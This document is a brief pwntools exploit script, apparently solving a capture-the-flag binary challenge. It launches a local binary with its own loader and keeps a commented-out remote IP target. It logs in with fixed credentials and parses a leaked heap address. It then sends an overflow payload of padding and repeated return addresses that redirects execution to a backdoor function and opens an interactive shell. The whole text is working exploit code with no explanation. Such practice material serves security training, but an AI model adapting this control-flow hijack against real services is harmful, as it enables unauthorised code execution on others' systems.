from pwn import *
file_name = './pwn'
ld_name = './ld-linux-x86-64.so.2'
io = process([ld_name, '--library-path', '.', file_name])
#io = remote("175.27.251.122",33052)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
rt = lambda x: io.recvuntil(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
rt("input your name:")
s("admin")
rt("input your pasword:")
s("123456")
rt('\n')
rt('\n')
rt('0x')
heap = int(io.recv(12),16)
print("heap:",hex(heap))
ret = 0x401254
bd = 0x401236
pd = flat(ret)
pd += b'a'*0x40
pd += flat(ret,ret,ret,bd)
#gdb.attach(io,"b *0x4012B3")
s(pd)
io.interactive()
